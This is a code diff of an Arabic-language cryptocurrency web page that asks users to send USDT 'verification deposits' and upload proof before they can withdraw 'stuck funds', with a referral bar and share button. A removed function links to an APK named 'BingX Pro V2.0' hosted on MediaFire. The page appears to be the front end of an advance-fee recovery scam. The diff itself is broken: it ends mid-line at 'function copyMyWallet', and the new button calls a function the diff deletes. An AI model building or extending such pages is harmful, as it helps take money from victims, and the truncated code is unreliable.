@@ -21,6 +21,7 @@ body{
   background: var(--bg-gradient);
   color:#fff;
   direction:rtl;
+  overflow-x:hidden;
 }
 .container{
   max-width:700px;
@@ -33,6 +34,7 @@ body{
   font-size:24px;
   margin-bottom:15px;
   text-align:center;
+  position:relative;
 }
 .card{
   background:var(--card-bg);
@@ -86,24 +88,57 @@ input::placeholder{color:var(--text-muted);}
   margin:10px 0;
   border-radius:6px;
 }
-.share-section{
-  background:rgba(255,255,255,0.08);
-  padding:12px;
+/* زر مشاركة التطبيق عائم */
+#share-btn{
+  position:fixed;
+  bottom:20px;
+  right:20px;
+  background:var(--accent);
+  color:#000;
+  padding:12px 16px;
+  border-radius:50px;
+  font-weight:700;
+  cursor:pointer;
+  box-shadow:0 6px 20px rgba(0,0,0,0.5);
+  display:flex;
+  align-items:center;
+  gap:6px;
+  z-index:9999;
+}
+/* شريط دعوة الأصدقاء متحرك */
+#invite-bar{
+  width:100%;
+  overflow:hidden;
+  background:rgba(0,0,0,0.2);
   border-radius:8px;
+  padding:6px 0;
   margin-bottom:20px;
-  text-align:center;
+  position:relative;
+}
+#invite-bar p{
+  display:inline-block;
+  white-space:nowrap;
+  position:absolute;
+  will-change:transform;
+  animation:scroll-left 10s linear infinite;
+  margin:0;
+  padding-left:100%;
+}
+@keyframes scroll-left{
+  0%{transform:translateX(100%);}
+  100%{transform:translateX(-100%);}
 }
 </style>
 </head>
 <body>
+
+<!-- شريط دعوة الأصدقاء -->
+<div id="invite-bar">
+  <p>ادعُ أصدقائك لتحصل على خصم 10$ لكل شخص ينضم!</p>
+</div>
+
 <div class="container">
   <div class="brand">أهلاً بكم بإيداع التحقق وسحب الأموال العالقة</div>
-
-  <!-- قسم مشاركة التطبيق -->
-  <div class="share-section">
-    <p>شارك التطبيق لتحصل على خصم 10$ لكل شخص ينضم!</p>
-    <button class="btn btn-primary" onclick="shareApp()">شارك التطبيق</button>
-  </div>
 
   <!-- خانة إيداع التحقق -->
   <div class="card">
@@ -156,6 +191,9 @@ input::placeholder{color:var(--text-muted);}
   </div>
 </div>
 
+<!-- زر مشاركة التطبيق عائم -->
+<div id="share-btn" onclick="shareApp()"><i class="fas fa-share"></i> شارك التطبيق</div>
+
 <script>
 document.getElementById('proof-file').addEventListener('change', e=>{
   const f = e.target.files[0];
@@ -184,31 +222,4 @@ function submitVerificationDeposit(){
   alert(`تم إرسال طلب التحقق لمبلغ ${amt} USDT بنجاح، قيد المراجعة.`);
 }
 
-function copyMyWallet(){
-  const wallet = document.getElementById('my-wallet').value;
-  if(wallet) navigator.clipboard.writeText(wallet).then(()=>alert('تم نسخ المحفظة الخاصة بي'));
-}
-
-function requestWithdraw(){
-  const name = document.getElementById('user-name').value.trim();
-  const ref = document.getElementById('ref-code').value.trim();
-  const email = document.getElementById('user-email').value.trim();
-  const amt = parseFloat(document.getElementById('withdraw-amount').value);
-  const wallet = document.getElementById('withdraw-target-wallet').value.trim();
-  const lockedFile = document.getElementById('locked-funds-file').files[0];
-
-  if(!name||!ref||!email){alert('يرجى تعبئة جميع البيانات'); return;}
-  if(isNaN(amt)||amt<=0){alert('أدخل مبلغ سحب صالح'); return;}
-  if(!wallet){alert('أدخل عنوان محفظتك'); return;}
-  if(!lockedFile){alert('يرجى رفع صورة الأموال العالقة'); return;}
-  alert(`تم تقديم طلب السحب بنجاح بمبلغ ${amt} USDT`);
-}
-
-function shareApp(){
-  const url='https://www.mediafire.com/file/7fi3cvqggr9d2fg/BingX+Pro+V2.0.apk/file';
-  window.open(url,'_blank');
-  alert('تم تحويلك لمشاركة التطبيق، ستحصل على خصم 10$ لكل شخص ينضم');
-}
-</script>
-</body>
-</html>
+function copyMyWallet
